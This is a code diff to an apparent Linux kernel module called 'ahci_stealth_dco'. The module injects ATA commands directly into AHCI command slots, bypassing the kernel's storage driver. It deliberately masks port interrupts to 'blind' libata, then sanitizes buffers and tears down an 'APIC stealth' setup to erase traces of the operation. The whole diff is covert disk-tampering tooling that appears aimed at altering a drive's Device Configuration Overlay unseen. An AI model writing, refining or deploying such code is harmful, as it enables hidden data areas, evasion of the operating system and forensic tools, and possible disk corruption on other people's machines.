@@ -17,26 +17,7 @@ extern void trigger_nmi_execution(void);
 extern void stealth_sanitize_and_flush(void *addr, size_t size);
 
 /**
- * stealth_map_ram - Safe kernel physical system RAM mapping wrapper using memremap
- */
-static void *stealth_map_ram(u64 phys_addr, size_t size)
-{
-    if (!phys_addr)
-        return NULL;
-    return memremap(phys_addr, size, MEMREMAP_WB);
-}
-
-/**
- * stealth_unmap_ram - Safe kernel system RAM unmapping wrapper using memunmap
- */
-static void stealth_unmap_ram(void *virt_addr)
-{
-    if (virt_addr)
-        memunmap(virt_addr);
-}
-/*
- * scan_for_available_slot - Dynamically checks both PxCI and PxSACT to ensure 
- * absolute isolation from standard and NCQ active transactions.
+ * scan_for_available_slot - Dynamically scans PxCI and PxSACT and available slots to find a safe index
  */
 static int scan_for_available_slot(void __iomem *port_base)
 {
@@ -69,11 +50,10 @@ static int __init ahci_stealth_dco_init(void)
 {
     void __iomem *abar_base = NULL;
     void *port_base = NULL;
-    void *slot0_virt = NULL;
-    void *slot_target_virt = NULL;
-    void *ctba_virt = NULL;
-    void *data_virt = NULL;
-    void *slot0_ctba_virt = NULL;
+    void __iomem *slot0_virt = NULL;
+    void __iomem *slot_target_virt = NULL;
+    void __iomem *ctba_virt = NULL;
+    void __iomem *data_virt = NULL;
 
     struct sata_fis_h2d    *fis;
     struct ahci_cmd_header *hdr0, *hdr_target;
@@ -139,13 +119,13 @@ static int __init ahci_stealth_dco_init(void)
     /* 4. Dynamically Choose an Available Slot */
     target_slot = scan_for_available_slot(port_base);
 
-    /* Map Slot 0 and the dynamically chosen target slot via system RAM mapping */
-    slot0_virt = stealth_map_ram(lst_phys + (0 * 32), PAGE_SIZE);
-    slot_target_virt = stealth_map_ram(lst_phys + (target_slot * 32), PAGE_SIZE);
+    /* Map Slot 0 and the dynamically chosen target slot */
+    slot0_virt = manual_direct_map(lst_phys + (0 * 32));
+    slot_target_virt = manual_direct_map(lst_phys + (target_slot * 32));
     if (!slot0_virt || !slot_target_virt) {
-        pr_err("[STEALTH_DCO] FATAL: stealth_map_ram failed for command slots\n");
+        pr_err("[STEALTH_DCO] FATAL: manual_direct_map failed for command slots\n");
         ret = -EFAULT;
-        goto out_cleanup_slots;
+        goto out_abar;
     }
 
     hdr0 = (struct ahci_cmd_header *)slot0_virt;
@@ -157,34 +137,27 @@ static int __init ahci_stealth_dco_init(void)
     if (!slot0_ctba_phys || !slot_target_ctba_phys) {
         pr_err("[STEALTH_DCO] FATAL: Pre-allocated CTBA addresses are invalid\n");
         ret = -EFAULT;
-        goto out_cleanup_slots;
+        goto out_abar;
     }
 
-    ctba_virt = stealth_map_ram(slot_target_ctba_phys, PAGE_SIZE);
+    ctba_virt = manual_direct_map(slot_target_ctba_phys);
     if (!ctba_virt) {
         pr_err("[STEALTH_DCO] FATAL: Failed to map target slot CTBA\n");
         ret = -EFAULT;
-        goto out_cleanup_slots;
+        goto out_abar;
     }
 
-    slot0_ctba_virt = stealth_map_ram(slot0_ctba_phys, PAGE_SIZE);
-    if (!slot0_ctba_virt) {
-        pr_err("[STEALTH_DCO] FATAL: Failed to map slot 0 CTBA\n");
-        ret = -EFAULT;
-        goto out_cleanup_slots;
-    }
-
-    prdt0 = (struct ahci_prdt_entry *)((char *)slot0_ctba_virt + 0x80);
+    prdt0 = (struct ahci_prdt_entry *)((char *)manual_direct_map(slot0_ctba_phys) + 0x80);
     data_phys = ((u64)prdt0->dbau << 32) | prdt0->dba;
     if (!data_phys) {
         data_phys = slot0_ctba_phys + 0x100;
     }
 
-    data_virt = stealth_map_ram(data_phys, PAGE_SIZE);
+    data_virt = manual_direct_map(data_phys);
     if (!data_virt) {
         pr_err("[STEALTH_DCO] FATAL: Failed to map pre-allocated data buffer\n");
         ret = -EFAULT;
-        goto out_cleanup_slots;
+        goto out_abar;
     }
 
     memset((void *)ctba_virt, 0, 256);
@@ -192,6 +165,7 @@ static int __init ahci_stealth_dco_init(void)
 
     /* ------------------------------------------------------------------------
      * BLINDING SETUP: Temporarily mask port interrupts (PxIE @ offset 0x14)
+     * to prevent libata from processing asynchronous state changes.
      * ------------------------------------------------------------------------ */
     old_pxie = readl((char *)port_base + 0x14);
     writel(0, (char *)port_base + 0x14);
@@ -278,28 +252,25 @@ static int __init ahci_stealth_dco_init(void)
     }
 
 restore_pxie:
-    writel(0xFFFFFFFF, (char *)port_base + 0x10); /* Clear PxIS */
+    /* Clear any pending status flags and restore original PxIE mask */
+    writel(0xFFFFFFFF, (char *)port_base + 0x10); // Clear PxIS
     writel(old_pxie, (char *)port_base + 0x14);
     wmb();
-
-out_cleanup_slots:
-    if (slot0_virt) stealth_unmap_ram(slot0_virt);
-    if (slot_target_virt) stealth_unmap_ram(slot_target_virt);
-    if (ctba_virt) {
-        stealth_sanitize_and_flush((void *)ctba_virt, 256);
-        stealth_unmap_ram(ctba_virt);
-    }
-    if (slot0_ctba_virt) stealth_unmap_ram(slot0_ctba_virt);
-    if (data_virt) {
-        stealth_sanitize_and_flush((void *)data_virt, 512);
-        stealth_unmap_ram(data_virt);
-    }
 
 out_abar:
     if (abar_base)
         iounmap(abar_base);
 
+    /* APIC-serialized stealth sanitization and cache line flushing */
+    if (ctba_virt) {
+        stealth_sanitize_and_flush((void *)ctba_virt, 256);
+    }
+    if (data_virt) {
+        stealth_sanitize_and_flush((void *)data_virt, 512);
+    }
+
 out_apic:
+    /* Clean up persistent APIC mapping before exit */
     cleanup_apic_stealth_subsystem();
 
     pr_info("[STEALTH_DCO] ---- TRANSIENT EXECUTION FINISHED (ret=%d) ----\n", ret);
